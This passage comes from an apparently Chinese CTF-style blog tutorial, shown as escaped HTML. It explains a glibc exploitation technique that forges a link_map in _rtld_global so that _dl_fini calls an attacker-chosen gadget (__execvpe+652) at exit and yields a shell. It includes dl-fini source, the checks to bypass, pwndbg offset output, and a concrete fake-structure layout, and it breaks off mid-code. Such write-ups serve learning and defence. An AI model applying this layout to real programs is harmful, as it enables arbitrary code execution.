[%lu]\n\n&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					  DSO_FILENAME (l-&amp;gt;l_name),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					  ns);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;comment&#34;&gt;/* First see whether an array is given.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_info[DT_FINI_ARRAY] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  ElfW(Addr) *&lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt; =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    (ElfW(Addr) *) (l-&amp;gt;l_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					    + l-&amp;gt;l_info[DT_FINI_ARRAY]-&amp;gt;d_un.d_ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = (l-&amp;gt;l_info[DT_FINI_ARRAYSZ]-&amp;gt;d_un.d_val&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					    / &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (ElfW(Addr)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (i-- &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    ((&lt;span class=&#34;type&#34;&gt;fini_t&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;[i]) ();					&lt;span class=&#34;comment&#34;&gt;//目标位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结下我们需要绕过那些检查&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;判断 &lt;code&gt;_ns_loaded&lt;/code&gt;  链表中至少有三个节点（dl-fini 开始部分通过循环遍历链表，做检查，）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 &lt;code&gt;l == l-&amp;gt;l_real&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 &lt;code&gt;l-&amp;gt;l_init_called &amp;gt; 8&lt;/code&gt;            这个其实跟数据的处理有关&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_relocated:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* Nonzero if object&amp;#x27;s relocations done.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_init_called:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;/* Nonzero if DT_INIT function called.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_global:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* Nonzero if object in _dl_global_scope.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_reserved:&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* Reserved for internal use.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_phdr_allocated:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;/* Nonzero if the data structure pointed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					to by `l_phdr&amp;#x27; is allocated.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_soname_added:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;/* Nonzero if the SONAME is for sure in&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 lunk_map 结构体中，这个变量是 4 字节，与结构体开始位置的偏移量为 0x31c。pwndbg 帮我们解释了数据的结果，这里的数据要大于 8，我们不妨之际设置为 9. 不同节点可以有所差异，下面是一个结果为 1 的数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;p4.png&#34; alt=&#34;p4&#34;&gt;&lt;/p&gt;
&lt;p&gt;以及一个不为 1 的数据&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; link_map *)&lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_addr = &lt;span class=&#34;number&#34;&gt;140725148598272&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_name = &lt;span class=&#34;number&#34;&gt;0x7ffd207e4371&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;linux-vdso.so.1&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_ld = &lt;span class=&#34;number&#34;&gt;0x7ffd207e43e0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_next = &lt;span class=&#34;number&#34;&gt;0x7f56e4382000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_prev = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_real = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_relocated = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_init_called = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_global = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/wx &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x31c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43baaec&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 &lt;code&gt;l-&amp;gt;l_info[DT_FINI_ARRAY] != NULL&lt;/code&gt; ，unsigned int i = (l-&amp;gt;l_info[DT_FINI_ARRAYSZ]-&amp;gt;d_un.d_val&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​	DT_FINI_ARRAY 宏定义为 26，DT_FINI_ARRAYSZ 宏定义为 28，所以 l_info [26], 以及 l_info [28] 不能是 null (28 是因为 i 会影响到函数 ((fini_t) array [i]) (); 调用)&lt;/p&gt;
&lt;p&gt;下面我们具体说说如何伪造，我选择利用修改第三节点的 l_next 指针，指向一个 chunk, 并在 chunk 上部署我们伪造的 link_map. 这里依赖任意地址写，可通过 largebin attack 实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global 符号并不在 libc 文件，而是在 ld.so 文件中，我们要泄露出程序的 ld 基址，pwndbg 为我们提供了一个函数求偏移量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance &amp;amp;_rtld_global &amp;amp;(_rtld_global._dl_ns._ns_loaded-&amp;gt;l_next-&amp;gt;l_next-&amp;gt;l_next)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43b9040&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e4382018&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;-0x37028&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;-0x6e05&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此我们就知道了需要向哪里写入 chunk.&lt;/p&gt;
&lt;p&gt;接下来就是重点，我们如何伪造 link_map.&lt;/p&gt;
&lt;p&gt;因为原来的链表中只有 4 个节点，而我们伪造的 link_map 有恰是第四个，所以，l_next 就是 0，l_prve 无所谓，直接写 0 即可。l_real 就是我们的伪造的 link_map 的开始地址，也是我们修改后的第三节点的 l_next 的值。这几个值离 link_map 的首地址很近，可以很直接的看出偏移量。接下来就是 l_info 的伪造。l_info [26] 不为 0，这是结构体内的数组，distance 可以得到 info [26] info [28] 关于节点地址的偏移量，同样我们可以得到上面提到的 l_init_called 的偏移量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance _rtld_global._dl_ns._ns_loaded &amp;amp;_rtld_global._dl_ns._ns_loaded-&amp;gt;l_info[&lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba330&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;0x110&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;0x22&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance _rtld_global._dl_ns._ns_loaded &amp;amp;_rtld_global._dl_ns._ns_loaded-&amp;gt;l_info[&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba340&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;0x24&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance _rtld_global._dl_ns._ns_loaded &amp;amp;_rtld_global._dl_ns._ns_loaded-&amp;gt;l_init_called&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba53c&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;0x31c&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;0x63&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重点来了，info 这连个位置我们写入什么数据&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  l_info = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a656f072f8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x7f56e4244cec&lt;/span&gt; &amp;lt;__execvpe+&lt;span class=&#34;number&#34;&gt;652&lt;/span&gt;&amp;gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a656f072e0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a656f072e8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x9&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_info[DT_FINI_ARRAY] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  ElfW(Addr) *&lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt; =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    (ElfW(Addr) *) (l-&amp;gt;l_addr+ l-&amp;gt;l_info[DT_FINI_ARRAY]-&amp;gt;d_un.d_ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = (l-&amp;gt;l_info[DT_FINI_ARRAYSZ]-&amp;gt;d_un.d_val/ &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (ElfW(Addr)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (i-- &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    ((&lt;span class=&#34;type&#34;&gt;fini_t&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;[i]) ();					&lt;span class=&#34;comment&#34;&gt;//目标位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是一个比较通用的 info，0x7f56e4244cec &amp;lt;__execvpe+652&amp;gt; 是我们想要执行的函数。&lt;/p&gt;
&lt;p&gt;我们再看源码的相关部分，正常情况下，exit 使用的就是第四个节点的 l_info 的数据，也就是使用我们伪造的 info。&lt;/p&gt;
&lt;p&gt;sizeof (ElfW (Addr)) = 8，为了方便解释，我们将这里 l-&amp;gt;l_info [DT_FINI_ARRAYSZ] 的数据记为 ptr，ptr-&amp;gt;d_un.d_ptr, 其实就是 ptr+0x8 所指向的数据。ptr 是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得 shell，我们不妨让 i =1, 然后我们需要在 ptr+8 的位置写入的就是 1*8=8&lt;/p&gt;
&lt;p&gt;我们还要确定的是 arry 数组。(l-&amp;gt;l_addr+ l-&amp;gt;l_info [DT_FINI_ARRAY]-&amp;gt;d_un.d_ptr);&lt;/p&gt;
&lt;p&gt;l-&amp;gt;addr 其实就是我们伪造的 link_map 开始的位置，个人喜欢将这里写为 0，然后将 l_info [26] 写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为 ptr_a, 这个就会给 arry 赋值，然后	arry [i]	====&amp;gt;&amp;gt;  就是调用 ptr_a +8*i 位置的函数。也就是我们的后门。&lt;/p&gt;
&lt;p&gt;提供一个构造的布局，&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;fake+0x110&lt;/code&gt;  写入一个 ptr_a，且 ptr_a+0x8 处有 ptr，ptr 处写入的是最后要执行的函数地址.&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;fake+0x120&lt;/code&gt;  写入一个 ptr，且 ptr+0x8 处是 &lt;code&gt;i*8&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;我选择的是 &lt;code&gt;fake+0x110&lt;/code&gt;  写入 &lt;code&gt;fake+0x40&lt;/code&gt; ，在 &lt;code&gt;fake+0x48&lt;/code&gt;  写入 &lt;code&gt;fake+0x58&lt;/code&gt; ，在 &lt;code&gt;fake+0x58&lt;/code&gt;  写入 shell&lt;/p&gt;
&lt;p&gt;我选择在 &lt;code&gt;fake+0x120&lt;/code&gt;  写入 &lt;code&gt;fake+0x48&lt;/code&gt; ，在 &lt;code&gt;fake+0x50&lt;/code&gt;  处写入 8.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span 